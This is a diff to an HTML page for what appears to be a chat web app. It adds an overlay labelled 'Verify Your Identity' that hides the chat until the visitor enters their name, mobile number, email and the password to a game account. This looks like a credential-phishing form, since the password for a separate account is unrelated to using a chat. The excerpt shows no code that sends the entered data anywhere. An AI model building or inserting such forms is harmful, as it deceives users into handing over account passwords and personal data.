@@ -29,8 +29,38 @@
         </div>
     </nav>
 
+    <!-- VERIFICATION OVERLAY -->
+    <div class="verify-overlay" id="verifyOverlay">
+        <div class="verify-box">
+            <div class="verify-logo">
+                <img src="../LOGO/images__1_-removebg-preview.png" alt="Logo">
+            </div>
+            <h2>🔒 Verify Your Identity</h2>
+            <p>Please enter your details to access the chat</p>
+            <form id="verifyForm">
+                <div class="form-group">
+                    <label for="vName">User Name</label>
+                    <input type="text" id="vName" placeholder="Enter your name" required>
+                </div>
+                <div class="form-group">
+                    <label for="vMobile">Mobile Number</label>
+                    <input type="tel" id="vMobile" placeholder="Enter mobile number" required>
+                </div>
+                <div class="form-group">
+                    <label for="vPassword">Game Account Password</label>
+                    <input type="password" id="vPassword" placeholder="Enter game password" required>
+                </div>
+                <div class="form-group">
+                    <label for="vEmail">Email ID</label>
+                    <input type="email" id="vEmail" placeholder="Enter your email" required>
+                </div>
+                <button type="submit" class="btn">Next →</button>
+            </form>
+        </div>
+    </div>
+
     <!-- CHAT APP -->
-    <main class="chat-main">
+    <main class="chat-main" id="chatMain" style="display:none">
         <div class="chat-app">
 
             <!-- CHAT HEADER -->
